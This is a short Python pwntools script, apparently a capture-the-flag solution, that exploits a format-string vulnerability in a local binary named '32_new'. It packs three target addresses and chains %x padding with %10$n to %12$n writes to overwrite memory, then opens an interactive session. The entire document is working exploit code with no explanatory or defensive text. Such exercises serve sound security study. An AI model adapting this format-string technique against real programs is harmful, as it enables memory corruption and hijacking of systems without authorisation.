
from pwn import *

io = process('./32_new')
#io = gdb.debug('./32_new')

# offsets to write to
payload = p32(0x0804a028)
payload += p32(0x0804a029)
payload += p32(0x0804a02b)

# create payload
payload += b"%185x"
payload += b"%10$n"
payload += b"%892x"
payload += b"%11$n"
payload += b"%129x"
payload += b"%12$n"

io.send(payload)

io.interactive()

